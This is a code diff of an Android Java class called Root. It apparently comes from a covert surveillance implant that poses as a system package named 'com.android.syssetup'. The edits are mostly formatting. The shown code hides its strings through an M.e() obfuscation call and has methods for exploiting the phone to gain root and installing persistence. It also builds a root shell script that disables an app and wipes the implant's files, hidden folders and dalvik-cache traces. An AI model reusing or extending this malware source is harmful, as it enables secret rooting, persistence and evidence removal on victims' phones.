@@ -5,6 +5,7 @@ import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.os.Build;
 
+import com.android.mm.M;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.capabilities.PackageInfo;
 import com.android.syssetup.conf.Configuration;
@@ -19,7 +20,6 @@ import com.android.syssetup.util.Execute;
 import com.android.syssetup.util.ExecuteResult;
 import com.android.syssetup.util.PackageUtils;
 import com.android.syssetup.util.Utils;
-import com.android.mm.M;
 
 import java.io.BufferedInputStream;
 import java.io.BufferedOutputStream;
@@ -50,16 +50,16 @@ import javax.crypto.spec.IvParameterSpec;
 
 public class Root {
 	private static final String TAG = "Root";
+	private final static String SU = M.e("su");
 	public static String method = "";
 	public static Date startExploiting = new Date();
+	static Semaphore semGetPermission = new Semaphore(1);
+	static String[] appToDisable = new String[]{M.e("com.samsung.videohub")};
 	private static int askedSu = 0;
 	private static boolean oom_adjusted;
-	private final static String SU = M.e("su");
-	private Markup markupOldApk;
-	static Semaphore semGetPermission = new Semaphore(1);
 	//private static final int DEL_OLD_FILE_MARKUP = 1;
 	private static Markup markup = new Markup(Markup.DEL_OLD_FILE_MARKUP);
-	static String[] appToDisable = new String[]{ M.e("com.samsung.videohub")};
+	private Markup markupOldApk;
 
 	private static boolean installed(String name) {
 
@@ -97,7 +97,7 @@ public class Root {
 	static public boolean shouldAskForAdmin() {
 		boolean ret = false;
 
-		if( Status.isBlackberry()){
+		if (Status.isBlackberry()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (shouldAskForAdmin) BUILD: " + Build.BOARD);
 			}
@@ -136,7 +136,7 @@ public class Root {
 
 	static public boolean exploitPhone(boolean synchronous) {
 
-		if( Status.isBlackberry()){
+		if (Status.isBlackberry()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (exploitPhone) BUILD: " + Build.BOARD);
 			}
@@ -353,7 +353,7 @@ public class Root {
 			//script += Configuration.shellFile + " qzx \"rm -r " + Path.hidden() + "\"\n";
 			String script = "";
 			for (String app : appToDisable) {
-				if(installed(app)) {
+				if (installed(app)) {
 					script += M.e("pm disable ") + app + "\n";
 				}
 			}
@@ -373,17 +373,17 @@ public class Root {
 			// the
 
 			script += String.format(M.e(" [ -e %s ] && rm %s 2>/dev/null"), Status.persistencyApk, Status.persistencyApk) + "\n";
-			if(!Status.isPersistent()){
+			if (!Status.isPersistent()) {
 				script += M.e("sleep 5\n");
 			}
 			script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), M.e("/sdcard/.lost.found"), M.e("/sdcard/.lost.found")) + "\n";
 			script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), M.e("/sdcard/1"), M.e("/sdcard/1")) + "\n";
 			script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), M.e("/sdcard/2"), M.e("/sdcard/2")) + "\n";
 			//if(Status.isPersistent()){
-				script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), Status.getAppDir(), Status.getAppDir()) + "\n";
-				script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), Path.hidden(), Path.hidden()) + "\n";
-				// TODO: mettere Status.persistencyApk e packageName
-				script += M.e("for i in `ls /data/app/*com.android.syssetup* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
+			script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), Status.getAppDir(), Status.getAppDir()) + "\n";
+			script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), Path.hidden(), Path.hidden()) + "\n";
+			// TODO: mettere Status.persistencyApk e packageName
+			script += M.e("for i in `ls /data/app/*com.android.syssetup* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
 			//}
 			script += M.e("for i in `ls /data/dalvik-cache/*com.android.syssetup* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
 			script += M.e("for i in `ls /data/dalvik-cache/*StkDevice* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
@@ -408,13 +408,13 @@ public class Root {
 				}
 			}
 			for (String app : appToDisable) {
-				if(installed(app)) {
+				if (installed(app)) {
 					script += M.e("pm enable ") + app + "\n";
 				}
 			}
 			Core.serivceUnregister();
 			boolean ret = Execute.executeRootAndForgetScript(script);
-			if(!ret){
+			if (!ret) {
 				Execute.executeScript(script);
 			}
 
@@ -464,7 +464,7 @@ public class Root {
 			return true;
 		}
 
-		if(Cfg.DEMO){
+		if (Cfg.DEMO) {
 			Status.self().makeToast("Install Persistence");
 		}
 
@@ -860,13 +860,13 @@ public class Root {
 	}
 
 
-	public static  void installPersistence() {
+	public static void installPersistence() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (installPersistence): tryInstall PERSISTENCE=" + Cfg.PERSISTENCE + " root=" + Status.haveRoot() + " status=" + Status.getPersistencyStatus() + " isGuiVisible= " +
 					Status.isGuiVisible());
 		}
 
-		synchronized(Status.uninstallLock) {
+		synchronized (Status.uninstallLock) {
 			if (Cfg.PERSISTENCE && Status.haveRoot() && !Status.uninstall && Status.getPersistencyStatus() == Status.PERSISTENCY_STATUS_TO_INSTALL && !Status.isGuiVisible()) {
 				Root.installPersistence(false);
 				Status.self().setReload();
